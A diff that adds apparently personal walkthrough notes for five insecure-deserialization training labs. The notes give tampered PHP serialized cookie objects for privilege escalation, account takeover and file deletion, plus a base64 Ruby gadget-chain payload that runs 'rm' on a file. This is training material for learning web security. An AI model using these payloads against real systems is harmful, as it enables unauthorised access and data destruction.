@@ -1,0 +1,79 @@
+Task 1:
+///Lab: Modifying serialized objects///
+
+Open the site in burp and log in as wiener/peter. Inspect the GET /my-account?id=wiener request in repeater. If you're attentive enough, you notice that the session cookie is a base64 code (after URL decoding).
+Yo can easily decoding this: in the repeater tab on the right side there is an Ispector panel. click on it there is a 'request cookies', click on it, and there is your session cookie. There is a little '>' arrow next
+to the cookie, click on it and you will see the decoded cookie:
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
+After url decoding:
+Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=
+After base64 decoding:
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;} which is a php object. Which means the admin attribute is b:0, which means b:false. Its a boolean value. if you change it to 1, it becomes true, which will
+grant us admin rights. So change it to 1:
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}   and click on apply changes. Send the request, and as you can see you have admin rights. From the source we know that /admin is the admin panel,
+so change the query and send the request. from this all you have to do is change the query again to: /admin/delete?username=carlos send the request, and that all.
+
+Task 2:
+///Lab: Modifying serialized data types///
+
+Do the same like before. This time this is our php object:
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ismfpqd74xweevnid3zobe395nvc8uxj";}
+The 's' parameters means how long is the value. So s:8 means the "username" will be 8 characters, the "wiener" will be 6, etc...We want to break into the user called "administrator" so change the middle parameter to 
+S:13 "administrator", and we wont need the acces token, so change the s to 0, and change the token to an integer:0...our new object will look like this:
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;} If you send the request like this, you will get a 302 found. To see the admin panel change the request query to /admin
+Now you can change the query to /admin/delete?username=carlos and send it.
+
+Task 3:
+///Lab: Using application functionality to exploit insecure deserialization///
+
+Open the site in burp. Log in as wiener/peter. 
+Our object now is: O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"acwzj86corfklekn3bnfsu72e7ecwyar";s:11:"avatar_link";s:19:"users/wiener/avatar";} Our job is to delete a file.
+On your account page you will see a Delete account button. In burp turn in intercept and the click on the button and check the request:
+It deletes your account, and as you can see from the cookie's object it deletes your avatar. So we will modify to delete the account and instead of deleting the avatar, we will delete the txt file.
+So send the /my-account/delete request to repeater and drop the alive request and turn off intercept.
+Now modify the object like we did before:
+O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"acwzj86corfklekn3bnfsu72e7ecwyar";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+Send the request, and you will get az internal server error, but in source you will find this:
+PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username] = a0lf9l953imbfqy7837yd6pmq6vhu3d9, $user-&gt;access_token = acwzj86corfklekn3bnfsu72e7ecwyar, $access_tokens = [a0lf9l953imbfqy7837yd6pmq6vhu3d9, hm2236k3krgr31drfrbnmenp9r5khy56, acwzj86corfklekn3bnfsu72e7ecwyar]) Invalid access token for user carlos in /var/www/index.php:8
+Stack trace:
+#0 {main}
+  thrown in /var/www/index.php on line 8
+All you have to do is copy out these tokens into your object like this:
+O:4:"User":3:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"a0lf9l953imbfqy7837yd6pmq6vhu3d9";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";} And if you get an error like:
+PHP Warning:  file_put_contents(users/carlos/disabled): failed to open stream: No such file or directory in /home/carlos/User.php on line 45
+PHP Fatal error:  Uncaught Exception: Could not write to users/carlos/disabled in /home/carlos/User.php:46
+Stack trace:
+#0 Command line code(5): User-&gt;delete()
+#1 {main}
+  thrown in /home/carlos/User.php on line 46
+Then you solved the lab. Deleted the user and the file also.
+
+
+Task 4:
+///Lab: Arbitrary object injection in PHP///
+
+Open the site in Burp and log in as wiener/peter. View the source code. At the end of it you will find a line like this:
+                   <!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
+This indicates us that this php file exists. So insert this path into the url, and open it. As you can see this is an empty page. Send the request to repeater. Sometimes if you add a ~ to the file name
+it allows us to read the file so try it out:
+GET /libs/CustomTemplate.php~ HTTP/2
+And there is the php file in the response. 
+The end of the php file is really insteresting for us:
+    function __destruct() {
+        // Carlos thought this would be a good idea
+        if (file_exists($this->lock_file_path)) {
+            unlink($this->lock_file_path);
+This funcion checks if the files exist and if it is, then its delete the file. We will use this in our session cookie to delete the file.
+To do this send the GET /my-account?id=wiener request to repeater and copy out the php object from the session cookie:
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vmaezkdeob9lhuc1inhu2nk9fn2d668v";}
+So first of all instead of user we will use the php's name, this is where we call the funcions: so it will start with 0:14:"CustomTemplate", then we implement the lock_file_path attribute s:14:"lock_file_path" and instead
+of the username and access token we will give the path of the file: s:23:"/home/carlos/morale.txt", and change the 2 to 1 because we have only one defined property in the { } (username and access_token  >>> lock_file_path).
+So Put this together:
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+Copy this in the base64 part, and apply changes. Send the request and we solved the lab.
+
+Task 5:
+///Lab: Exploiting Ruby deserialization using a documented gadget chain///
+
+BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
+
